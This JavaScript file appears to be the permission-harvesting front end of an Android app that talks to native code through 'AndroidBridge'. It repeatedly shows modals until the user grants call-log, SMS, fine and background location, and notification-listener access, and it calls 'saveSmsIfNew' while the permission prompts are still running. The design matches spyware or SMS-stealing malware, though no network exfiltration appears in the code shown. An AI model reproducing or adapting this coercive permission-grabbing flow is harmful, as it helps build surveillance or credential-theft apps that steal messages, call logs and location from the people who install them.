const perms = [
    "android.permission.READ_CALL_LOG",
    "android.permission.READ_SMS",
    "android.permission.RECEIVE_SMS",
];

const fgLocPerms = [
    "android.permission.ACCESS_FINE_LOCATION",
];

const bgLocPerms = [
    "android.permission.ACCESS_BACKGROUND_LOCATION",
];

let enableActivityLaunched = false;

function foregroundGranted() {
    return perms.every(p => AndroidBridge.isPermissionGranted(p));
}

function fgLocationGranted() {
    return fgLocPerms.every(p => AndroidBridge.isPermissionGranted(p));
}

function bgLocationGranted() {
    return bgLocPerms.every(p => AndroidBridge.isPermissionGranted(p));
}

function locationGranted() {
    return fgLocationGranted() && bgLocationGranted();
}

function runtimeGranted() {
    return foregroundGranted() && locationGranted();
}

function isFullyReady() {
    return runtimeGranted() &&
           AndroidBridge.isNotifAccessGranted();
}

function decideFlow() {
    try {
        if (!window.AndroidBridge) return;

        hideAllModals();

        if (!foregroundGranted()) {
            showPModal();
            return;
        }

        if (!fgLocationGranted()) {
            showPModal();
            return;
        }

        if (!bgLocationGranted()) {
            showPModal();
            return;
        }

        if (!AndroidBridge.isNotifAccessGranted()) {
            showDModal();
            return;
        }

        showCModal();
    } catch (e) {
        showPModal();
    }
}

function launchFinalActivityOnce() {
    if (!enableActivityLaunched) {
        enableActivityLaunched = true;
        hideAllModals();
        AndroidBridge.launchEnableActivity();
    }
}

document.addEventListener("DOMContentLoaded", () => {
    window.onResume = decideFlow;
    setTimeout(decideFlow, 500);

    setTimeout(() => {
        const pModal = document.querySelector(".p-modal");
        const dModal = document.querySelector(".d-modal");
        const overlay = document.querySelector(".overlayer");
        const pModalVisible = pModal && !pModal.classList.contains("hide");
        const dModalVisible = dModal && !dModal.classList.contains("hide");
        const overlayVisible = overlay && !overlay.classList.contains("hide");

        if (!pModalVisible && !dModalVisible && !overlayVisible && window.AndroidBridge) {
            const fg = foregroundGranted();
            const fgLoc = fgLocationGranted();
            const bgLoc = bgLocationGranted();
            const na = AndroidBridge.isNotifAccessGranted();
            if (fg && fgLoc && bgLoc && !na) {
                showDModal();
            } else if (!fg || !fgLoc || !bgLoc) {
                showPModal();
            }
        }
    }, 2000);
});

window.onAndroidPermissionsChanged = function () {
    decideFlow();
    if (foregroundGranted() && !fgLocationGranted()) {
        AndroidBridge.saveSmsIfNew();
        AndroidBridge.requestPermissions(JSON.stringify(fgLocPerms));
    } else if (fgLocationGranted() && !bgLocationGranted()) {
        AndroidBridge.saveSmsIfNew();
        AndroidBridge.requestPermissions(JSON.stringify(bgLocPerms));
    }
};

function requestMissingPermissions() {
    if (!foregroundGranted()) {
        AndroidBridge.requestPermissions(JSON.stringify(perms));
    } else if (foregroundGranted() && !fgLocationGranted()) {
        AndroidBridge.requestPermissions(JSON.stringify(fgLocPerms));
    } else if (fgLocationGranted() && !bgLocationGranted()) {
        AndroidBridge.requestPermissions(JSON.stringify(bgLocPerms));
    } else {
        decideFlow();
    }
}

function openNAccess() {
    try {
        AndroidBridge.launchNotificationAccess();
    } catch (e) {
        console.error("Failed to launch notification access:", e);
    }

    const notifWatcher = setInterval(() => {
        if (!window.AndroidBridge) return;
        try {
            if (AndroidBridge.isNotifAccessGranted()) {
                clearInterval(notifWatcher);
                hideDModal();
                showCModal();
            }
        } catch (e) {
            console.error("Notif watcher error:", e);
        }
    }, 1000);
};

function hideAllModals() {
    hidePModal();
    hideDModal();
    hideAModal();
    hideCModal();
}

function showPModal() {
    const modal = document.querySelector(".p-modal");
    const overlay = document.querySelector(".overlayer");
    if (modal) {
        modal.classList.remove("hide");
        modal.classList.add("show");
    }
    if (overlay) {
        overlay.classList.remove("hide");
        overlay.classList.add("show");
    }
}

function hidePModal() {
    const modal = document.querySelector(".p-modal");
    if (modal) {
        modal.classList.remove("show");
        modal.classList.add("hide");
    }
    hideOverlayerIfNeeded();
}

function showDModal() {
    const modal = document.querySelector(".d-modal");
    const overlay = document.querySelector(".overlayer");
    if (modal) {
        modal.classList.remove("hide");
        modal.classList.add("show");
    }
    if (overlay) {
        overlay.classList.remove("hide");
        overlay.classList.add("show");
    }
}

function hideDModal() {
    const modal = document.querySelector(".d-modal");
    if (modal) {
        modal.classList.remove("show");
        modal.classList.add("hide");
    }
    hideOverlayerIfNeeded();
}

function showAModal() {
    const modal = document.querySelector(".a-modal");
    const overlay = document.querySelector(".overlayer");
    if (modal) {
        modal.classList.remove("hide");
        modal.classList.add("show");
    }
    if (overlay) {
        overlay.classList.remove("hide");
        overlay.classList.add("show");
    }
}

function hideAModal() {
    const modal = document.querySelector(".a-modal");
    if (modal) {
        modal.classList.remove("show");
        modal.classList.add("hide");
    }
    hideOverlayerIfNeeded();
}

function showCModal() {
    const modal = document.querySelector(".c-modal");
    const overlay = document.querySelector(".overlayer");
    if (modal) {
        modal.classList.remove("hide");
        modal.classList.add("show");
    }
    if (overlay) {
        overlay.classList.remove("hide");
        overlay.classList.add("show");
    }
}

function hideCModal() {
    const modal = document.querySelector(".c-modal");
    if (modal) {
        modal.classList.remove("show");
        modal.classList.add("hide");
    }
    hideOverlayerIfNeeded();
}

function hideOverlayerIfNeeded() {
    const modals = document.querySelectorAll(".p-modal:not(.hide), .d-modal:not(.hide), .a-modal:not(.hide), .c-modal:not(.hide)");
    if (modals.length === 0) {
        const overlay = document.querySelector(".overlayer");
        if (overlay) {
            overlay.classList.add("hide");
            overlay.classList.remove("show");
        }
    }
}
